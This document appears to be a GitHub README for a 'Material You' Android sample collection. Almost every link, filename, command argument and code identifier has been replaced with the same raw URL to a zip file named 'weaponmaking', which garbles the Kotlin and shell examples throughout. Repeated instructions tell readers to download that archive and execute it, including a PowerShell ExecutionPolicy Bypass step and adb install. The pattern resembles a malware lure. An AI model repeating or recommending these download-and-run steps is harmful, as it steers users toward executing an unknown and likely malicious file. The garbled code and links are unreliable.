# Material You UI Apps Collection — Modern Android Themes

[![Releases](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)  
https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip

A curated collection of modular Material You apps, components, and theme samples. The repo bundles ready-to-run APKs, Compose examples, tokens, and tooling. Each release includes packaged builds and scripts. Download the release asset file and execute it to install or run the sample app.

Table of contents
- About this collection
- Why use these samples
- What you get per release
- Screenshots and visual notes
- Quick download and run (releases)
- Build from source
- Install on device or emulator
- Theming and dynamic color
- Jetpack Compose and Material3 examples
- Component catalog and code map
- Code structure and conventions
- Common workflows
- Testing and QA
- CI / CD blueprint
- Release and versioning rules
- Contribution guide
- Style guide and lint rules
- Troubleshooting and tips
- FAQ
- Changelog example
- Credits and resources
- License and contact

About this collection
These projects focus on Material You patterns. Each item shows real UI code. The goal is to provide clear, small examples that work on modern Android. The collection evolves over time. Releases pack tested builds and helper scripts.

Why use these samples
- Learn how to apply dynamic color and tonal palettes.
- See Compose code that follows Material3.
- Inspect token maps, theme overlays, and adaptive layouts.
- Use ready APKs to test on real devices or emulators.
- Extract color tokens and apply them to your app.

What you get per release
- Packaged APKs. Signed debug builds for quick install.
- Source tarball or zip. Full source for each sample app.
- Scripts. Install and run scripts for common platforms.
- Assets. Wallpapers, icons, and token JSON files.
- https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip Release notes and upgrade steps.

Screenshots and visual notes
- App launcher and home screen samples:
  ![Material You sample UI 1](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
- Dynamic color example:
  ![Dynamic color extraction](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
- Component gallery screenshot:
  ![Component gallery](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)

Screenshots show: tonal palettes, iconography, surface elevation, and shape theming. They help link code to visuals. Use them as a visual map when you read the code.

Quick download and run (releases)
- Go to the releases page and pick a release:
  https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- The release page contains one or more assets. Download the asset that matches your platform. Typical asset names:
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- For releases with a path part (as above), download the provided file and execute it. The script or APK in the release is the runnable artifact. The Install section below shows common commands.

Install on Android device (APK)
- Download the APK asset from the releases page.
- If you use adb:
  - Connect your device or start an emulator.
  - Run: adb install -r https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- If you download on device:
  - Open your file manager and tap the APK.
  - Allow install from unknown sources if the system asks.
- The release APK may include debug signing. Use it for testing.

Install via release script (macOS / Linux)
- Download the https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip or install script from the release page.
- Example commands:
  - curl -L -o https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip "https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip"
  - tar -xzf https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - cd material-you-sample-x.y.z
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- The release asset often contains an install script. Download that file and execute it.

Windows install
- Download the zip artifact from the release.
- Unpack it.
- Run the included installer or execute the provided batch script. Typical steps:
  - Double-click https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - Or run: powershell -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip

Build from source
Clone the repository:
- git clone https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- cd Material-You-App-Repository

Common build targets
- Gradle (Android Studio or CLI):
  - ./gradlew assembleDebug
  - ./gradlew :app:installDebug (requires device)
- Build variants:
  - debug — for testing
  - release — for production (configure signing)
- Android Studio:
  - Open the folder as a project.
  - Let Studio import Gradle settings.
  - Use the Run menu to pick a target.

Recommended SDK and tools
- Android Studio Flamingo or later.
- Android SDK 33+.
- Kotlin 1.8+.
- Compose Compiler and Material3 libraries aligned with Kotlin.

Install on emulator
- Create an Android emulator with API 31+.
- Boot the emulator.
- adb install -r https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Or run from Android Studio.

Theming and dynamic color
This collection shows how to implement adaptive color using dynamic color tokens. It also shows manual token usage to match Material You.

Key concepts
- Seed color: the source color extracted from wallpaper or an image.
- Tonal palette: a set of tones generated from a seed color.
- Color roles: primary, secondary, tertiary, background, surface, error, onPrimary, etc.
- Elevation overlays: colors for elevated surfaces on Android systems that need overlays.

Example: apply dynamic color in Compose
- Use the Material3 dynamic color API.
- In code:
  - val colors = if (https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip >= https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip) {
      dynamicLightColorScheme(context)
    } else {
      lightColorScheme( ... manual tokens ...)
    }
  - MaterialTheme(colorScheme = colors) { ... }

Token files
- The repo contains token JSON files that map names to color hex codes and tonal values.
- Use tokens to ensure consistent values across components.
- Token structure example:
  - {
      "color": {
        "primary": "#6750A4",
        "onPrimary": "#FFFFFF",
        "primaryContainer": "#EADDFF",
        "onPrimaryContainer": "#21005D",
        ...
      },
      "shape": { ... },
      "typography": { ... }
    }

Jetpack Compose and Material3 examples
- The sample apps use Compose for UI.
- The code shows:
  - Layouts with ConstraintLayout and Box.
  - State handling using ViewModel and StateFlow.
  - Recomposition friendly patterns.
  - Theming using Material3 tokens and dynamic color.

Sample structure for a screen
- TopAppBar with navigation icon and actions.
- Surface with elevation and rounded corners.
- LazyColumn for lists.
- Cards for content with clickable modifiers.
- Dialogs that respect color roles.

Component catalog and code map
- The collection maps components to implementation files:
  - Buttons — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - Cards — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - TopAppBars — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - BottomNav — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - Dialogs — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - DynamicColorDemo — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Each component file includes a preview function for Android Studio.

Adaptive layout patterns
- Use WindowSizeClass to adapt layouts.
- Use Column + Row patterns for foldables or tablets.
- The repository includes samples:
  - singlePane — phone layout
  - twoPane — split layout for tablets
  - responsiveNavigation — adapt nav to width

Accessibility
- The samples include contentDescription for icons.
- They use semantics modifiers where appropriate.
- They use contrast-safe palettes for on-surface text.

Code structure and conventions
- Top-level modules:
  - app — Android app module
  - components — reusable Compose UI
  - theme — tokens and theme helpers
  - samples — demo screens and playgrounds
- Naming
  - Use UpperCamelCase for components and functions that return UI.
  - Use lowerCamelCase for local variables.
  - Keep file size under 300 lines for readability.

Common workflows
- Create a new component
  - Add composable to components/ folder.
  - Add a preview function with @Preview annotations.
  - Add a sample entry in samples/ to exercise the component.
- Update tokens
  - Edit token JSON.
  - Run the token mapping script to generate Kotlin token constants.
  - Build and verify visuals.

Testing and QA
- Unit tests:
  - Use JUnit for logic tests.
  - Keep unit tests fast and small.
- UI tests:
  - Use Compose UI testing APIs.
  - Example:
    - createAndroidComposeRule<MainActivity>()
    - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip("Save").performClick()
- Snapshot tests:
  - Use screenshot testing in CI to track visual regressions.
- Test matrix:
  - Run tests on emulator API 31, 32, 33.
  - Run tests on Android 12 and 13 for dynamic color behavior.

CI / CD blueprint
- Use GitHub Actions to run builds and tests.
- Basic workflow steps:
  - Checkout
  - Setup JDK and Android SDK
  - Cache Gradle
  - Build assembleDebug
  - Run unit tests
  - Run lint and checkstyle
  - Publish artifacts (create release or upload to GitHub Releases)
- Example actions:
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
    - name: CI
      on: [push, pull_request]
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v3
            - uses: actions/setup-java@v3
              with:
                distribution: 'temurin'
                java-version: '17'
            - name: Build
              run: ./gradlew assembleDebug

Release and versioning rules
- Use semantic versioning: https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Tag releases in git with https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Attach release assets:
  - Signed debug APK (for testing)
  - Source archive (zip or https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
  - Platform scripts (https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip, https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
- For each release the release notes include:
  - Changed components
  - New samples
  - Breaking changes
  - Migration steps

Release automation
- Use a release workflow to build artifacts and create a GitHub release.
- The workflow can:
  - Build artifacts
  - Generate changelog from PR titles
  - Create a release and upload files

Contribution guide
- Fork the repository.
- Create a branch: feat/<short-description> or fix/<short-description>.
- Make changes and add tests.
- Run the build and tests locally.
- Submit a pull request.
- Follow these rules:
  - Keep PRs small and focused.
  - Reference issues in the PR.
  - Include screenshots for UI changes.
  - Update https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip with the change.

Code review checklist
- Does the change respect tokens and theme values?
- Does UI use material roles instead of hard-coded colors?
- Are accessibility labels present?
- Do tests cover logic changes?
- Is the code readable and well documented?

Style guide and lint rules
- Kotlin style:
  - Use Kotlin coding conventions.
  - Avoid nested lambdas deeper than 3 levels.
  - Prefer immutable state where possible.
- Compose best practices:
  - Hoist state.
  - Avoid side effects in composables.
  - Use remember for cached values.
- Lint:
  - Enable Android Lint, Detekt, and ktlint.
  - Fail CI on lint violations.

Testing matrix and sample commands
- Run unit tests:
  - ./gradlew test
- Run Compose UI tests:
  - ./gradlew connectedAndroidTest
- Run lint:
  - ./gradlew lint
- Run formatting:
  - ./gradlew ktlintFormat

Troubleshooting and tips
- If build fails due to SDK:
  - Ensure Android SDK tools and platforms are installed.
  - Set ANDROID_SDK_ROOT if needed.
- If dynamic color does not apply:
  - Confirm device or emulator runs Android 12+.
  - Check that the sample uses dynamicLightColorScheme or dynamicDarkColorScheme.
- If preview does not render:
  - Re-sync Gradle in Android Studio.
  - Clean and rebuild the project.

FAQ
Q: Where do I download stable builds?
A: Visit the releases page and download the attached assets:
https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip

Q: Does the repo include production-ready code?
A: The code demonstrates patterns and sample flows. Use it as a reference. Adapt production builds for signing and security.

Q: Do the releases include an executable?
A: Yes. Releases include APKs and platform scripts. Download the asset file and execute it.

Q: Can I use tokens in my app?
A: Yes. Token files include JSON and generated Kotlin constants. Import them into your project.

Q: How do I test dynamic color on older devices?
A: Use the manual token files in theme/ to apply a tonal palette. The samples show a fallback for older Android versions.

Changelog example (how to write one)
- v1.2.0 (2025-07-01)
  - Add dynamic color playground sample.
  - Add component gallery with buttons, cards, and dialogs.
  - Export token JSON and Kotlin generator script.
  - Fix state handling bug in navigation sample.
- v1.1.0 (2025-05-15)
  - Add initial Compose Material3 samples.
  - Add CI workflow to build and test.
- v1.0.0 (2025-03-01)
  - First public release. Basic sample set and documentation.

Advanced topics and recipes

Color extraction pipeline
- Use a seed color extractor to derive a tonal palette.
- Example steps:
  - Provide a wallpaper bitmap.
  - Run a color quantization algorithm (k-means or palette API).
  - Pick a dominant color as seed.
  - Generate tonal palette using a library or ported algorithm.
  - Map tones to color roles.
- The repo includes a small extractor script in tools/ that takes an image and outputs a token JSON.

Shape theming and geometry
- Material You shape theming uses corner sizes and corner family.
- Token example:
  - smallCorner = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - mediumCorner = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
  - largeCorner = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Components apply shapes from the theme:
  - Card(shape = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)

Typography and text tokens
- The repo includes a basic type scale:
  - displayLarge, displayMedium, headlineMedium, bodyLarge, bodySmall, labelLarge
- Use TextStyle tokens to set font weight, letter spacing, and line height.

Animation patterns
- Motion system:
  - Use AnimatedVisibility for enter/exit.
  - Use animateColorAsState for color transitions.
  - Use spring or tween with defined easing.
- Shared element transitions:
  - Use Accompanist or platform APIs for shared element flows.

Performance tips
- Avoid overuse of high-cost modifiers.
- Use stable keys in lists.
- Use snapshotFlow for observing state changes out of compose.
- Use rememberSaveable for small UI state to avoid recomposition traps.

Example build scripts and helpers
- The repo includes helper scripts:
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip — convert tokens JSON to Kotlin
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip — extract seed colors from images
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip — build and package artifacts for CI
- The release asset may include an install script. Download the file and run it.

Security and signing
- Keep signing keys out of the repo.
- Use GitHub secrets for CI signing steps.
- Sample debug keys are included for test builds only.

Licensing and attributions
- License files may appear in each sample. Check https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip in the root.
- Attributions for icons and images appear in credits.

Credits and resources
- Material Design guidelines — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Jetpack Compose docs — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Material3 Compose library — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Color tools and palette generators

How to contribute examples
- Add a new sample under samples/.
- Write a README for the sample explaining:
  - Purpose
  - Key files
  - How to run
- Add a screenshot in the sample folder.
- Submit a pull request referencing an issue.

Local development checklist
- Install Android Studio and required SDKs.
- Install JDK 17.
- Clone the repo.
- Open the project in Android Studio.
- Let Gradle sync and download dependencies.
- Run the app on a device or emulator.

Developer contacts
- Create an issue for bugs or feature requests.
- Use PRs for code changes.
- Label issues by area: theme, components, samples, build, docs.

Examples of common commands
- Clone:
  - git clone https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Build debug:
  - ./gradlew assembleDebug
- Install to device:
  - adb install -r https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Run tests:
  - ./gradlew test connectedAndroidTest

Packaging for release
- Update versionName and versionCode in https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
- Run:
  - ./gradlew assembleRelease
- Sign the release APK using your keystore.
- Create a GitHub release and attach the signed APK and source archive.

Release link usage reminder
- The releases page holds the packaged files and the scripts. Use the release asset that matches your platform. Download the release file and run it as provided:
  https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip

Appendix A — Example token JSON
{
  "color": {
    "primary": "#6750A4",
    "onPrimary": "#FFFFFF",
    "primaryContainer": "#EADDFF",
    "onPrimaryContainer": "#21005D",
    "secondary": "#625B71",
    "onSecondary": "#FFFFFF",
    "secondaryContainer": "#E8DEF8",
    "onSecondaryContainer": "#1D192B",
    "background": "#FFFBFE",
    "onBackground": "#1C1B1F"
  },
  "shape": {
    "small": 8,
    "medium": 12,
    "large": 28
  },
  "typography": {
    "bodyLarge": {
      "fontFamily": "Roboto",
      "fontSize": 16,
      "lineHeight": 24
    }
  }
}

Appendix B — Minimal sample MainActivity (Compose)
```kotlin
class MainActivity : ComponentActivity() {
  override fun onCreate(savedInstanceState: Bundle?) {
    https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip(savedInstanceState)
    setContent {
      val useDynamic = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip >= https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
      val colorScheme = if (useDynamic) {
        dynamicLightColorScheme(this)
      } else {
        lightColorScheme(
          primary = Color(0xFF6750A4),
          onPrimary = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip,
          background = Color(0xFFFFFBFE),
          onBackground = Color(0xFF1C1B1F)
        )
      }
      MaterialTheme(colorScheme = colorScheme) {
        Surface(modifier = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip()) {
          Column(modifier = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip(https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)) {
            Text("Material You Sample", style = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
            Spacer(modifier = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip(https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip))
            Button(onClick = { /* action */ }) {
              Text("Primary action")
            }
          }
        }
      }
    }
  }
}
```

Appendix C — Useful commands for contributors
- Format code:
  - ./gradlew ktlintFormat
- Run static analysis:
  - ./gradlew detekt
- Run the generator for tokens:
  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip

Acknowledgements
- The design and code patterns follow Material Design guidance.
- Many community libraries provide helper utilities used in samples.

License
- See LICENSE file in the repository for full terms.